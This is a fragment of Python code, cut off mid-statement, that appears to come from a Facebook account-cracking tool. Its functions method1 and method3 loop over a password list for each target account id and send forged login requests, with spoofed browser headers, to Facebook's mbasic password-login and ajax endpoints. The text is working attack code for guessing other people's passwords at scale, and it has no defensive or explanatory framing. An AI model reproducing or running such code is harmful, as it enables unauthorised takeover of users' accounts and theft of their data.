...
def method1(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            hed2 = {'authority': 'www.facebook.com',
            'method': 'POST',
            'path': '/ajax/bz?__a=1&__ccg=EXCELLENT&__comet_req=0&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW3q327E2vwXw5ux60Vo1upE4W0OE2WxO0FE2awt81sbzo5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E&__hs=19364.BP%3ADEFAULT.2.0.0.0.0&__hsi=7185742280268098932&__req=1&__rev=1006795802&__s=6oc49w%3A05lla7%3Atqwee2&__spin_b=trunk&__spin_r=1006795802&__spin_t=1673061000&__user=0&dpr=1&jazoest=2980&lsd=AVqFb0wFtnU',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '3035',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9Axo5gUBzwP0BssA',
            ...
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            next = r.post('https://www.facebook.com/ajax/bz?__a=1&__ccg=EXCELLENT&__comet_req=0&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW3q327E2vwXw5ux60Vo1upE4W0OE2WxO0FE2awt81sbzo5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E&__hs=19364.BP%3ADEFAULT.2.0.0.0.0&__hsi=7185742280268098932&__req=1&__rev=1006795802&__s=6oc49w%3A05lla7%3Atqwee2&__spin_b=trunk&__spin_r=1006795802&__spin_t=1673061000&__user=0&dpr=1&jazoest=2980&lsd=AVqFb0wFtnU',data=data,headers=hed2,allow_redirects = False).text
...
def method3(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            r = requests.Session()
            url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {'authority': 'www.facebook.com',
            'method': 'POST',
            'path': '/ajax/bz?__a=1&__ccg=EXCELLENT&__comet_req=0&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW3q327E2vwXw5ux60Vo1upE4W0OE2WxO0FE2awt81sbzo5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E&__hs=19364.BP%3ADEFAULT.2.0.0.0.0&__hsi=7185742280268098932&__req=1&__rev=1006795802&__s=6oc49w%3A05lla7%3Atqwee2&__spin_b=trunk&__spin_r=1006795802&__spin_t=1673061000&__user=0&dpr=1&jazoest=2980&lsd=AVqFb0wFtnU',
            'scheme': 'https',
            'accept': '*/*',
            ...
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            req1 = r.get('https://www.facebook.com/ajax/bz?__a=1&__ccg=EXCELLENT&__comet_req=0&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW3q327E2vwXw5ux60Vo1upE4W0OE2WxO0FE2awt81sbzo5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E&__hs=19364.BP%3ADEFAULT.2.0.0.0.0&__hsi=7185742280268098932&__req=1&__rev=1006795802&__s=6oc49w%3A05lla7%3Atqwee2&__spin_b=trunk&__spin_r=1006795802&__spin_t=1673061000&__user=0&dpr=1&jazoest=2980&lsd=AVqFb0wFtnU',headers=hed1)
            data = {'adid':adid,
             "format": "json",
              "device_id": str(uuid.uuid4()),
              "cpl": "true",
